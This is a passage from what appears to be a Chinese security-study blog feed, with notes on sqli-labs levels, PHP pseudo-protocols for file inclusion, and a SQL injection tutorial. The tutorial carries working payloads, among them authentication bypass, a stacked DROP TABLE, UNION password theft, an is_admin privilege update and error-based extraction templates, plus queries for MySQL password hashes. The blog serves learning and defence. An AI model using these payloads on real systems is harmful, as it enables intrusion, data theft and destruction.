<h1 id="less52"><a href="#less52" class="headerlink" title="less52"></a>less52</h1><p>数值型的盲注，和 Less 48 一样使用时间盲注就可以完成。</p>
<h1 id="less53"><a href="#less53" class="headerlink" title="less53"></a>less53</h1><p>单引号闭合的字符型,和 Less 49 一样使用时间盲注就可以完成。</p>
]]></content>
      <tags>
        <tag>sqlilab注入 web</tag>
      </tags>
  </entry>
  <entry>
    <title>php伪协议</title>
    <url>/2025/03/28/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="什么是php伪协议"><a href="#什么是php伪协议" class="headerlink" title="什么是php伪协议"></a>什么是php伪协议</h1><p>在 PHP 中，”伪协议”是一种特殊的语法，用于访问不同的资源或执行特定的操作。这些伪协议以 <code>php://</code> 开头，后面跟着特定的指示符或参数，以实现不同的功能。这些伪协议提供了一种方便的方式来处理各种输入输出操作，而不必依赖于实际的文件或网络资源。</p>
<h1 id="使用伪协议的函数"><a href="#使用伪协议的函数" class="headerlink" title="使用伪协议的函数"></a>使用伪协议的函数</h1><h3 id="1-file-get-contents"><a href="#1-file-get-contents" class="headerlink" title="1. file_get_contents()"></a>1. <strong><code>file_get_contents()</code></strong></h3><ul>
<li><strong>用途</strong>：读取文件或流内容。</li>
<li>常见伪协议：<ul>
<li><code>file://</code>：访问本地文件（默认协议）。</li>
<li><code>php://input</code>：读取原始 HTTP 请求体。</li>
<li><code>php://filter</code>：对资源进行过滤处理。</li>
</ul>
</li>
</ul>
<h3 id="2-fopen"><a href="#2-fopen" class="headerlink" title="2. fopen()"></a>2. <strong><code>fopen()</code></strong></h3><ul>
<li><strong>用途</strong>：打开文件或流。</li>
<li>常见伪协议<ul>
<li><code>php://temp</code> 或 <code>php://memory</code>：临时存储数据。</li>
<li><code>data://</code>：处理 Base64 或 URL 编码数据。</li>
</ul>
</li>
</ul>
<h3 id="3-include-require"><a href="#3-include-require" class="headerlink" title="3. include &#x2F; require"></a>3. <strong><code>include</code> &#x2F; <code>require</code></strong></h3><ul>
<li><strong>用途</strong>：包含并执行 PHP 文件。</li>
<li>常见伪协议：<ul>
<li><code>php://filter</code>：用于 LFI（本地文件包含）攻击或绕过限制。</li>
<li><code>data://</code>：直接执行编码后的代码。</li>
</ul>
</li>
</ul>
<h3 id="4-file"><a href="#4-file" class="headerlink" title="4. file()"></a>4. <strong><code>file()</code></strong></h3><ul>
<li><strong>用途</strong>：将文件读取到数组中。</li>
<li>常见伪协议：<ul>
<li><code>php://filter</code>：过滤文件内容。</li>
</ul>
</li>
</ul>
<h3 id="5-readfile"><a href="#5-readfile" class="headerlink" title="5. readfile()"></a>5. <strong><code>readfile()</code></strong></h3><ul>
<li><strong>用途</strong>：输出文件内容。</li>
<li>常见伪协议：<ul>
<li><code>php://output</code>：直接输出到缓冲区。</li>
</ul>
</li>
</ul>
<h3 id="6-copy"><a href="#6-copy" class="headerlink" title="6. copy()"></a>6. <strong><code>copy()</code></strong></h3><ul>
<li><strong>用途</strong>：复制文件或流。</li>
<li>常见伪协议：<ul>
<li><code>php://input</code>：读取 HTTP 请求体并保存到文件。</li>
</ul>
</li>
</ul>
<h3 id="7-stream-get-contents-fread"><a href="#7-stream-get-contents-fread" class="headerlink" title="7. stream_get_contents() &#x2F; fread()"></a>7. <strong><code>stream_get_contents()</code> &#x2F; <code>fread()</code></strong></h3><ul>
<li><strong>用途</strong>：读取流内容。</li>
<li>常见伪协议：<ul>
<li><code>php://memory</code> 或 <code>php://temp</code>：操作内存或临时流。</li>
</ul>
</li>
</ul>
<h3 id="8-file-put-contents"><a href="#8-file-put-contents" class="headerlink" title="8. file_put_contents()"></a>8. <strong><code>file_put_contents()</code></strong></h3><ul>
<li><p><strong>用途</strong>：写入数据到文件或流。</p>
</li>
<li><p>常见伪协议：</p>
<ul>
<li><code>php://output</code>：直接输出内容。</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="php支持的伪协议"><a href="#php支持的伪协议" class="headerlink" title="php支持的伪协议"></a>php支持的伪协议</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 file:// — 访问本地文件系统</span><br><span class="line">2 http:// — 访问 HTTP(s) 网址</span><br><span class="line">3 ftp:// — 访问 FTP(s) URLs</span><br><span class="line">4 php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">5 zlib:// — 压缩流</span><br><span class="line">6 data:// — 数据（RFC 2397）</span><br><span class="line">7 glob:// — 查找匹配的文件路径模式</span><br><span class="line">8 phar:// — PHP 归档</span><br><span class="line">9 ssh2:// — Secure Shell 2</span><br><span class="line">10 rar:// — RAR</span><br><span class="line">11 ogg:// — 音频流</span><br><span class="line">12 expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>

<h1 id="常用伪协议"><a href="#常用伪协议" class="headerlink" title="常用伪协议"></a>常用伪协议</h1><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><p>简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。</p>
<p><strong>php:&#x2F;&#x2F;filter</strong>可以获取指定文件源码。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。</p>
<p><strong>例子</strong>：<strong>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</strong></p>
<p>协议参数</p>
<h3 id="常见过滤器"><a href="#常见过滤器" class="headerlink" title="常见过滤器"></a>常见过滤器</h3><p><strong>string</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string.toupper</span><br><span class="line">转换为大写</span><br><span class="line">read=string.toupper/resource=data.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">string.tolower</span><br><span class="line">转换为小写</span><br><span class="line">write=string.tolower/resource=output.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">string.rot13</span><br><span class="line">ROT13 编码</span><br><span class="line">read=string.rot13/resource=secret.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">string.strip_tags</span><br><span class="line">移除 HTML/PHP 标签</span><br><span class="line">read=string.strip_tags?&lt;p&gt;&lt;a&gt;/resource=webpage.html</span><br><span class="line">(可选参数保留特定标签)</span><br></pre></td></tr></table></figure>

<p><strong>convert</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">convert.base64-decode</span><br><span class="line">Base64 解码</span><br><span class="line">write=convert.base64-decode/resource=decoded.bin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">convert.quoted-printable-encode</span><br><span class="line">引用可打印编码</span><br><span class="line">read=convert.quoted-printable-encode/resource=text.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">convert.quoted-printable-decode</span><br><span class="line">引用可打印解码</span><br><span class="line">read=convert.quoted-printable-decode/resource=qp.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">convert.iconv.*</span><br><span class="line">字符集转换</span><br><span class="line">(最强大/最危险)</span><br><span class="line">read=convert.iconv.UTF-8.ISO-8859-1/resource=utf8.txt</span><br></pre></td></tr></table></figure>

<p>常用字符集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8*</span><br><span class="line">ASCII*</span><br><span class="line">EUC-JP*</span><br><span class="line">SJIS*</span><br><span class="line">eucJP-win*</span><br><span class="line">SJIS-win*</span><br><span class="line">ISO-2022-JP</span><br><span class="line">ISO-2022-JP-MS</span><br><span class="line">CP932</span><br><span class="line">CP51932</span><br><span class="line">SJIS-mac（别名：MacJapanese）</span><br><span class="line">SJIS-Mobile#DOCOMO（别名：SJIS-DOCOMO）</span><br><span class="line">SJIS-Mobile#KDDI（别名：SJIS-KDDI）</span><br><span class="line">SJIS-Mobile#SOFTBANK（别名：SJIS-SOFTBANK）</span><br><span class="line">UTF-8-Mobile#DOCOMO（别名：UTF-8-DOCOMO）</span><br><span class="line">UTF-8-Mobile#KDDI-A</span><br><span class="line">UTF-8-Mobile#KDDI-B（别名：UTF-8-KDDI）</span><br><span class="line">UTF-8-Mobile#SOFTBANK（别名：UTF-8-SOFTBANK）</span><br><span class="line">ISO-2022-JP-MOBILE#KDDI（别名：ISO-2022-JP-KDDI）</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>photos</title>
    <url>/2024/08/05/photos/</url>
    <content><![CDATA[<p>测试 测试<br><img src="/images/OIP-C.jpg" alt="OIP-C" loading="lazy"></p>
]]></content>
  </entry>
  <entry>
    <title>sqlmap</title>
    <url>/2025/02/28/sqlmap/</url>
    <content><![CDATA[]]></content>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入深入</title>
    <url>/2025/07/02/sql%E6%B3%A8%E5%85%A5%E6%B7%B1%E5%85%A5/</url>
    <content><![CDATA[<p>q</p>
<h1 id="基础复习"><a href="#基础复习" class="headerlink" title="基础复习"></a>基础复习</h1><h2 id="IFORMATION-SCHEMA数据库"><a href="#IFORMATION-SCHEMA数据库" class="headerlink" title="IFORMATION_SCHEMA数据库"></a>IFORMATION_SCHEMA数据库</h2><p><strong>information_schema.tables</strong> 存储了所有存在<strong>数据库名</strong>、<strong>数据库表</strong>、<strong>表字段</strong>,其中，关键的三个表为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">information_schema.tables：    <span class="comment">#该数据表存储了mysql数据库中的所有数据表的表名</span></span><br><span class="line">关键字段：TABLE_SCHEMA -&gt;表示该表名属于哪个数据库名</span><br><span class="line">关键字段：TABLE_NAME -&gt;存储表的表名</span><br><span class="line">information_schema.columns:    <span class="comment">#该数据表存储了mysql数据库中的所有列的列名  ‘</span></span><br><span class="line">关键字段：TABLE_SCHEMA -&gt;该字段所属数据库名</span><br><span class="line">关键字段：TABLE_NAME -&gt;存储所属表的名称</span><br><span class="line">关键字段：COLUMN_NAME -&gt;该字段的名称</span><br><span class="line">information_schema.schemata:  <span class="comment">#该数据表存储了mysql数据库中的所有数据库的库名</span></span><br><span class="line">关键字段：SCHEMA_NAME -&gt;数据库名称</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查询所有数据库：<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line">查询当前数据库下的所有表：<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br><span class="line">查询指定库下的指定表下的列：<span class="keyword">select</span> table_schema,column_name,table_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;dvwa&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><p><strong>数据库信息</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">database()   数据库名称</span><br><span class="line">schema()  数据库名称</span><br></pre></td></tr></table></figure>

<p><strong>数据库版本信息</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VERSION()  数据库版本信息</span><br><span class="line">@@VERSION   数据库版本信息（系统变量）</span><br><span class="line">@@GLOBAL.VERSION  数据库版本信息（系统变量）</span><br></pre></td></tr></table></figure>

<p><strong>数据库用户信息</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user() 系统用户和登录主机名</span><br><span class="line">current_user() 当前登录用户和登录主机名</span><br><span class="line">system_user() 数据库系统用户账户名称和登录主机名</span><br><span class="line">session_user() 当前会话用户名和登录主机名</span><br></pre></td></tr></table></figure>

<p><strong>服务器主机信息</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@@HOSTNAME 主机名称</span><br><span class="line">@@datadir 数据库路径</span><br><span class="line">@@version_compile_os 操作系统版本</span><br></pre></td></tr></table></figure>

<p><strong>服务器其他信息</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load_file(&#x27;filepath&#x27;)：读取本地文件</span><br><span class="line">@@datadir：读取数据库路径</span><br><span class="line">@@basedir：mysql安装路径</span><br><span class="line">@@version_complie_os：查看操作系统</span><br></pre></td></tr></table></figure>

<h2 id="密码相关信息"><a href="#密码相关信息" class="headerlink" title="密码相关信息"></a>密码相关信息</h2><p><strong>加密方式：</strong></p>
<ul>
<li>MySQL 4.1 及之前使用 MYSQL323 加密（16 位哈希）。</li>
<li>MySQL 4.1 到 5.7 使用 mysql_native_password（SHA-1 哈希，41 位字符串，带 * 号）。</li>
<li>MySQL 8.0 默认使用 caching_sha2_password（SHA-256 哈希），同时支持</li>
</ul>
<p>当MySQL&lt;8.0时，是用 password() 函数对密码加密。当MySQL&gt;8.0时，MySQL取消了 password() 函数。</p>
<p><strong>密码存储位置：</strong></p>
<p>当MySQL&lt;5.7，密码字段在mysql数据库的user表的password字段里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user,password from mysql.user;</span><br></pre></td></tr></table></figure>

<p>当MySQL&gt;&#x3D;5.7，密码字段在mysql数据库的user表的authentication_string字段里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user,authentication_string from user;</span><br></pre></td></tr></table></figure>

<h1 id="sql常见出现点"><a href="#sql常见出现点" class="headerlink" title="sql常见出现点"></a>sql常见出现点</h1><h3 id="1-用户登录表单"><a href="#1-用户登录表单" class="headerlink" title="1. 用户登录表单"></a><strong>1. 用户登录表单</strong></h3><ul>
<li><p><strong>场景</strong>：登录页面的用户名&#x2F;密码输入框</p>
</li>
<li><p><strong>注入点：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; -- </span><br></pre></td></tr></table></figure>

<p>使查询恒真，绕过身份验证：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;[input]&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;[input]&#x27;</span></span><br><span class="line">→ <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="comment">-- &#x27; AND password = &#x27;任意值&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="2-搜索框"><a href="#2-搜索框" class="headerlink" title="2. 搜索框"></a><strong>2. 搜索框</strong></h3><ul>
<li><p><strong>场景</strong>：商品搜索、内容检索</p>
</li>
<li><p><strong>注入点：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;; DROP TABLE users; -- </span></span><br></pre></td></tr></table></figure>

<p>拼接后执行破坏性操作：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> name <span class="keyword">LIKE</span> <span class="string">&#x27;%[input]%&#x27;</span></span><br><span class="line">→ <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> name <span class="keyword">LIKE</span> <span class="string">&#x27;%&#x27;</span>; <span class="keyword">DROP</span> <span class="keyword">TABLE</span> users; <span class="comment">-- %&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="3-URL参数（GET请求）"><a href="#3-URL参数（GET请求）" class="headerlink" title="3. URL参数（GET请求）"></a><strong>3. URL参数（GET请求）</strong></h3><ul>
<li><p><strong>场景</strong>：分页、详情页ID（如 <code>product?id=123</code>）</p>
</li>
<li><p><strong>注入点：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">https:<span class="operator">/</span><span class="operator">/</span>example.com<span class="operator">/</span>product?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; UNION SELECT password FROM users --</span></span><br></pre></td></tr></table></figure>

<p>窃取敏感数据：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> id <span class="operator">=</span> [input]</span><br><span class="line">→ <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span><span class="string">&#x27; UNION SELECT password FROM users -- </span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="4-HTTP头部字段"><a href="#4-HTTP头部字段" class="headerlink" title="4. HTTP头部字段"></a><strong>4. HTTP头部字段</strong></h3><ul>
<li><p><strong>场景：</strong></p>
<ul>
<li><code>Cookie</code>（如会话ID）</li>
<li><code>User-Agent</code>（浏览器标识）</li>
<li><code>X-Forwarded-For</code>（客户端IP）</li>
</ul>
</li>
<li><p><strong>注入点：</strong></p>
<p>伪造恶意头部：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent: &#x27;; SELECT * FROM credit_cards --</span><br></pre></td></tr></table></figure>

<p>若后端记录日志时拼接SQL：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO logs (user_agent) VALUES (&#x27;[input]&#x27;)</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="5-排序参数（ORDER-BY）"><a href="#5-排序参数（ORDER-BY）" class="headerlink" title="5. 排序参数（ORDER BY）"></a><strong>5. 排序参数（ORDER BY）</strong></h3><ul>
<li><p><strong>场景</strong>：表格排序（如 <code>?sort=price</code>）</p>
</li>
<li><p><strong>注入点：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=(CASE WHEN (SELECT password FROM users WHERE id=1)=&#x27;admin&#x27; THEN price ELSE name END)</span><br></pre></td></tr></table></figure>

<p>通过条件判断盲注探测数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM products ORDER BY [input]</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="6-注册-更新表单"><a href="#6-注册-更新表单" class="headerlink" title="6. 注册&#x2F;更新表单"></a><strong>6. 注册&#x2F;更新表单</strong></h3><ul>
<li><p><strong>场景：</strong></p>
<ul>
<li>用户注册（邮箱、用户名）</li>
<li>个人资料更新（地址、电话）</li>
</ul>
</li>
<li><p><strong>注入点：</strong></p>
<p>在邮箱字段注入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;; UPDATE users SET is_admin=1 WHERE id=1001; -- </span><br></pre></td></tr></table></figure>

<p>篡改权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO users (email) VALUES (&#x27;[input]&#x27;)</span><br><span class="line">→ INSERT INTO users (email) VALUES (&#x27;&#x27;; UPDATE users SET is_admin=1 WHERE id=1001; -- &#x27;)</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="7-隐藏表单字段"><a href="#7-隐藏表单字段" class="headerlink" title="7. 隐藏表单字段"></a><strong>7. 隐藏表单字段</strong></h3><ul>
<li><p><strong>场景</strong>：<br>HTML中隐藏的<code>&lt;input type=&quot;hidden&quot;&gt;</code>（如用户ID、价格）</p>
</li>
<li><p><strong>注入点：</strong></p>
<p>篡改隐藏字段值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=&quot;user_id&quot; value=&quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>影响查询逻辑：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE orders SET status=&#x27;paid&#x27; WHERE user_id = [input]</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="8-API请求参数（JSON-XML）"><a href="#8-API请求参数（JSON-XML）" class="headerlink" title="8. API请求参数（JSON&#x2F;XML）"></a><strong>8. API请求参数（JSON&#x2F;XML）</strong></h3><ul>
<li><p><strong>场景</strong>：<br>RESTful API接口（如提交JSON数据）</p>
</li>
<li><p><strong>注入点：</strong></p>
<p>恶意JSON内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; &quot;username&quot;: &quot;admin&#x27;-- &quot;, &quot;password&quot;: &quot;any&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>若后端直接拼接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;admin&#x27;-- &#x27; AND password = &#x27;any&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="常见注入方法"><a href="#常见注入方法" class="headerlink" title="常见注入方法"></a>常见注入方法</h1></li>
</ul>
<h2 id="借助页面回显"><a href="#借助页面回显" class="headerlink" title="借助页面回显"></a>借助页面回显</h2><p><strong>基本步骤：</strong></p>
<p>1.判断注入类型</p>
<p>2.判断字段数</p>
<p>3.爆显示位</p>
<p>4.查库名，表名，列名…</p>
<h2 id="页面无回显"><a href="#页面无回显" class="headerlink" title="页面无回显"></a>页面无回显</h2><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p><strong>使用前提：</strong>Web 应用程序未关闭数据库报错函数，对于一些 SQL 语句的错误直接回显在页面上（注意不是代码的报错，代码的报错一般没什么有用信息）</p>
<h4 id="XPath语法错误"><a href="#XPath语法错误" class="headerlink" title="XPath语法错误"></a>XPath语法错误</h4><h5 id="updatexml‌函数的基本语法："><a href="#updatexml‌函数的基本语法：" class="headerlink" title="updatexml‌函数的基本语法："></a><strong>updatexml‌函数的基本语法：</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(xml_document, XPath_string, new_value)</span><br></pre></td></tr></table></figure>

<p>其中，xml_document是XML文档对象，XPath_string是Xpath路径表达式，new_value是更新后的内容。在报错注入中，我们通常将第一个和第三个参数设置为任意值，重点是通过第二个参数注入不符合Xpath语法的表达式，从而引起数据库报错，并通过错误信息获取数据。</p>
<p><strong>回显错误点：</strong><br>当 XPath_string 非法时，会报如下错误,并显示具体数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XPATH syntax error: &#x27;&lt;payload&gt;&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>模板：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(1,concat(0x1,查询语句),1)</span><br></pre></td></tr></table></figure>

<h5 id="extractvalue函数："><a href="#extractvalue函数：" class="headerlink" title="extractvalue函数："></a><strong>extractvalue函数：</strong></h5><p><code>extractvalue(xml_frag, xpath_expr)</code><br>其中，xml_frag是XML片段，xpath_expr是Xpath表达式。在报错注入中，通过提供一个无效的Xpath表达式，导致函数报错，从而获取数据。</p>
<p><strong>模板：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x1,查询语句))</span><br></pre></td></tr></table></figure>

<h4 id="GTID集格式报错"><a href="#GTID集格式报错" class="headerlink" title="GTID集格式报错"></a>GTID集格式报错</h4><h5 id="gtid-subset函数"><a href="#gtid-subset函数" class="headerlink" title="gtid_subset函数"></a><strong>gtid_subset函数</strong></h5><p>使用要求mysql&gt;&#x3D; 5.6</p>
<p><strong>功能：</strong><code>gtid_subset</code>函数用于判断 GTID 集合 set1 是否为 set2 的子集。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gtid_subset(set1, set2)</span><br></pre></td></tr></table></figure>

<p>当输入的 GTID 集合格式不合法时，MySQL 会抛出错误</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ERROR 1772 (HY000): Malformed GTID set specification &#x27;xxx&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>模板：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gtid_subset((查询语句), &#x27;1&#x27;);</span><br></pre></td></tr></table></figure>

<h5 id="GTID-SUBTRACT"><a href="#GTID-SUBTRACT" class="headerlink" title="GTID_SUBTRACT()"></a><strong>GTID_SUBTRACT()</strong></h5><p><strong>功能：</strong>计算两个 GTID 集合的差集</p>
<p><strong>模板：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gtid_subtract((查询语句), &#x27;1&#x27;);</span><br></pre></td></tr></table></figure>

<h4 id="rand函数导致主键重复报错（floor双查询）"><a href="#rand函数导致主键重复报错（floor双查询）" class="headerlink" title="rand函数导致主键重复报错（floor双查询）"></a>rand函数导致主键重复报错（floor双查询）</h4><p>原理见<strong>less4</strong></p>
<p><strong>模板：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((查询语句),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x</span><br></pre></td></tr></table></figure>

<h4 id="UUID主键报错"><a href="#UUID主键报错" class="headerlink" title="UUID主键报错"></a>UUID主键报错</h4><h5 id="UUID-TO-BIN"><a href="#UUID-TO-BIN" class="headerlink" title="UUID_TO_BIN"></a>UUID_TO_BIN</h5><p><strong>使用要求：</strong></p>
<p><code>MySQL &gt;= 5.7.6</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UUID_TO_BIN(uuid_str[, swap_flag])</span><br></pre></td></tr></table></figure>

<p><code>UUID_TO_BIN</code> 函数用于将 UUID 字符串转换为二进制格式</p>
<p>uuid_str 为合法的 UUID 字符串；<br>swap_flag（可选）为布尔值，用于指定是否转换时间戳顺序。</p>
<p>当输入参数格式非法时，MySQL 会抛出错误</p>
<p><strong>模板：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UUID_TO_BIN(查询语句);</span><br></pre></td></tr></table></figure>

<h5 id="BIN-TO-UUID"><a href="#BIN-TO-UUID" class="headerlink" title="BIN_TO_UUID"></a>BIN_TO_UUID</h5><p><strong>使用要求：</strong><code>MySQL ≥ 8.0.0</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BIN_TO_UUID(binary_uuid[, swap_flag])</span><br></pre></td></tr></table></figure>

<p><strong>模板：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BIN_TO_UUID(查询语句);</span><br></pre></td></tr></table></figure>

<h4 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h4><h5 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h5><p>1.若后端存在：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from data where title like &#x27;%可控%&#x27;;</span><br></pre></td></tr></table></figure>

<p>可以插入<code>&#39;-gtid_subtract(user(),1)-&#39;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from data where title like &#x27;%&#x27;-gtid_subtract(user(),1)-&#x27;%&#x27;;</span><br></pre></td></tr></table></figure>

<p>减号在这里的作用是运算符，同时也用于结束字符串的上下文，进入表达式运算的上下文，从而让**gtid_subtract(user(),1)**被执行</p>
<h5 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO users (id, name, age, email) VALUES (1, &#x27;可控点&#x27;, 30, &#x27;zhangsan@example.com&#x27;);</span><br></pre></td></tr></table></figure>

<p>同样使用之前的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO users (id, name, age, email) VALUES (1, &#x27;&#x27;-gtid_subtract(user(),1)-&#x27;&#x27;, 30, &#x27;zhangsan@example.com&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>适用于无回显，无报错，只有返回正确的错误页面的情况。</p>
<h5 id="condition"><a href="#condition" class="headerlink" title="condition"></a>condition</h5><p>我们在盲注中首先就要找到condition，这个condition控制着页面true和false的回显</p>
<h5 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h5><p>我们主要通过截取某个数据的字符然后根据返回的页面来判断对错。</p>
